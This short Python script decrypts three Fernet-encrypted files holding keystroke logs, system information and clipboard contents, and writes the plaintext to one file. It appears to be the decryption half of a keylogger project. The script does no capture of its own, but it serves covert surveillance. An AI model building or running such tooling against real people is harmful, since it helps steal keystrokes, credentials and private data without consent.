from cryptography.fernet import Fernet
from dotenv import load_dotenv
import os

load_dotenv()

key = os.getenv("ENCRYPTION_KEY")
base_path = os.getenv("BASE_PATH")

keys_info_e = 'e_keys_log.txt'
system_info_e = 'e_system_info.txt'
clipboard_info_e = 'e_clipboard.txt'

key_path = os.path.join(base_path, keys_info_e)
sys_path = os.path.join(base_path, system_info_e)
clip_path = os.path.join(base_path, clipboard_info_e)

encrypted_files = [key_path, sys_path, clip_path]

for file in encrypted_files:
    with open(file, 'rb') as f:
        data = f.read()
        f.close()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)
        f.close()
